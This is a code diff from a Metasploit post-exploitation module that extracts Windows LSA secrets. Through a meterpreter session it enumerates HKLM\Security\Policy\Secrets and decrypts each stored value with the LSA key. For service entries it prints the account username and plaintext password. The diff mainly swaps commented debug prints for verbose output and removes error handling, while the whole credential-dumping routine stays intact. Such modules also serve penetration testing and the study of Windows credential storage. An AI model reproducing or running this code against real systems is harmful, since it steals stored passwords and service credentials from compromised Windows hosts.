@@ -151,7 +151,7 @@ class Metasploit3 < Msf::Post
     aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
     aes.key = sha256x.digest
 
-    #print_status("digest #{sha256x.digest.unpack("H*")[0]}")
+    vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")
 
     decryptedkey = ''
 
@@ -161,16 +161,18 @@ class Metasploit3 < Msf::Post
       xx = aes.update(pol[i...i+16])
       decryptedkey += xx
     end
-    #print_good("Dec_Key #{decryptedkey}")
+    vprint_good("Dec_Key #{decryptedkey}")
 
     return decryptedkey
   end
+
+
   def reg_getvaldata(key,valname)
     v = nil
     begin
       root_key, base_key = client.sys.registry.splitkey(key)
       open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
-      #print("reading key: #{key}#{valname}\n")
+      vprint_status("reading key: #{key}#{valname}\n")
       v = open_key.query_value(valname).data
       open_key.close
     rescue
@@ -178,72 +180,59 @@ class Metasploit3 < Msf::Post
     end
     return v
   end
+
+
   #Decrypted LSA key is passed into this function
   def get_secret(lkey)
     sec_str = "\n"
-    begin
-      #LSA Secret key location within the register
-      root_key = "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\"
-      begin
-        key_arr = meterpreter_registry_enumkeys(root_key)
-        key_arr.each do |keys|
-          begin
-            mid_key = root_key + "\\" +  keys
-            sk_arr = meterpreter_registry_enumkeys(mid_key)
-            sk_arr.each do |mkeys|
-              begin
-                #CurrVal stores the currently set value of the key, in the case of
-                #services it usually come out as plan text
-                if(mkeys == "CurrVal")
-                  val_key = root_key + "\\" + keys + "\\" + mkeys
-                  v_name = ""
-                  sec = reg_getvaldata(val_key, v_name)
-                  if( @vista == 1 )
-                    #Magic happens here
-                    sec = sec[0..-1]
-                    sec = decrypt_lsa(sec, lkey)[1..-1].scan(/[[:print:]]/).join
-                  else
-                    #and here
-                    sec = sec[0xC..-1]
-                    sec = decrypt_secret(sec, lkey).scan(/[[:print:]]/).join
-                  end
-                  if(sec.length > 0)
-                    if(keys[0,4] == "_SC_")
-                      user_key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
-                      keys_c = keys[4,keys.length]
-                      user_key = user_key << keys_c
-                      n_val = "ObjectName"
-                      user_n = reg_getvaldata(user_key, n_val)
 
-                      #if the unencrypted value is not blank and is a service, print
-                      print_good("Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n")
-                      sec_str = sec_str << "Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n"
-                    else
-                      #if the unencrypted value is not blank, print
-                      print_good("Key: #{keys} \n Decrypted Value: #{sec}\n")
-                      sec_str = sec_str << "Key: #{keys} \n Decrypted Value: #{sec}\n"
-                    end
-                  end
-                else
-                  next
-                end
-              rescue ::Exception => e
-                print_error("Unable to open: #{val_key}")
-                print_error("Error: #{e.class} #{e}")
-              end
+    #LSA Secret key location within the register
+    root_key = "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\"
+
+    key_arr = meterpreter_registry_enumkeys(root_key)
+    key_arr.each do |keys|
+      mid_key = root_key + "\\" +  keys
+      sk_arr = meterpreter_registry_enumkeys(mid_key)
+      sk_arr.each do |mkeys|
+
+        #CurrVal stores the currently set value of the key, in the case of
+        #services it usually come out as plan text
+        if(mkeys == "CurrVal")
+          val_key = root_key + "\\" + keys + "\\" + mkeys
+          v_name = ""
+          sec = reg_getvaldata(val_key, v_name)
+          if( @vista == 1 )
+            #Magic happens here
+            sec = sec[0..-1]
+            sec = decrypt_lsa(sec, lkey)[1..-1].scan(/[[:print:]]/).join
+          else
+            #and here
+            sec = sec[0xC..-1]
+            sec = decrypt_secret(sec, lkey).scan(/[[:print:]]/).join
+          end
+
+          if(sec.length > 0)
+            if(keys[0,4] == "_SC_")
+              user_key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
+              keys_c = keys[4,keys.length]
+              user_key = user_key << keys_c
+              n_val = "ObjectName"
+              user_n = reg_getvaldata(user_key, n_val)
+
+              #if the unencrypted value is not blank and is a service, print
+              print_good("Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n")
+              sec_str = sec_str << "Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n"
+            else
+              #if the unencrypted value is not blank, print
+              print_good("Key: #{keys} \n Decrypted Value: #{sec}\n")
+              sec_str = sec_str << "Key: #{keys} \n Decrypted Value: #{sec}\n"
             end
-          rescue
-            print_error("Unable to open: #{mid_key}")
+          else
+            next
           end
         end
-      rescue ::Exception => e
-        print_error("Unable to open: #{root_key}")
-        print_error("Error: #{e.class} #{e}")
       end
-    rescue
-      print_error("Cannot find key.")
-    end
-  return sec_str
+    return sec_str
   end
 
   # The sauce starts here
